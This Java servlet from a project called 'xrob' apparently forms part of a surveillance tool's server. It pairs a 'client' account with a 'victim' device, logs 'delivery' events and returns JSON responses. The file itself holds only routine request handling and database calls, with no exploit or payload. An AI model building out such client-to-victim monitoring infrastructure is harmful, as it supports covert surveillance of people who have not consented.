package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.ClientVictimRelations;
import com.theah64.xrob.api.database.tables.Clients;
import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.APIResponse;
import com.theah64.xrob.api.utils.HeaderSecurity;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

/**
 * Created by theapache64 on 12/9/16.
 */
@WebServlet(urlPatterns = {BaseServlet.VERSION_CODE + "/connect/client_to_victim"}, name = "ConnectClientToVictimServlet")
public class ConnectClientToVictimServlet extends BaseServlet {

    private static final String[] REQUIRED_PARAMS = {Clients.COLUMN_CLIENT_CODE};

    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType(CONTENT_TYPE_JSON);
        final PrintWriter out = response.getWriter();
        try {
            final HeaderSecurity hs = new HeaderSecurity(request.getHeader(HeaderSecurity.KEY_AUTHORIZATION));

            final Request connectRequest = new Request(request, REQUIRED_PARAMS);

            final String clientCode = connectRequest.getStringParameter(Clients.COLUMN_CLIENT_CODE);
            final String clientId = Clients.getInstance().get(Clients.COLUMN_CLIENT_CODE, clientCode, Clients.COLUMN_ID);
            if (clientId != null) {
                final String victimId = hs.getVictimId();
                ClientVictimRelations cvr = ClientVictimRelations.getInstance();
                final boolean isAlreadyConnected = cvr.isConnected(clientId, victimId);
                if (!isAlreadyConnected) {
                    final boolean isConnected = cvr.connect(clientId, victimId);
                    if (isConnected) {
                        Deliveries.getInstance().add(new Delivery(victimId, false, "Client connection established with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                        out.write(new APIResponse("You're CONNECTED!", null).getResponse());
                    } else {
                        Deliveries.getInstance().add(new Delivery(victimId, true, "Client connection failed to establish with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                        throw new Exception("Error while establishing the connection!");
                    }
                } else {
                    Deliveries.getInstance().add(new Delivery(victimId, false, "Client re-connect request with Client-" + clientId, Delivery.TYPE_OTHER, 0));
                    throw new Exception("You're already connected to this victim");
                }
            } else {
                throw new Exception("Client doesn't exist with client code : " + clientCode);
            }

        } catch (Exception e) {
            e.printStackTrace();
            out.write(new APIResponse(e.getMessage()).getResponse());
        }
        out.flush();
        out.close();
    }

}
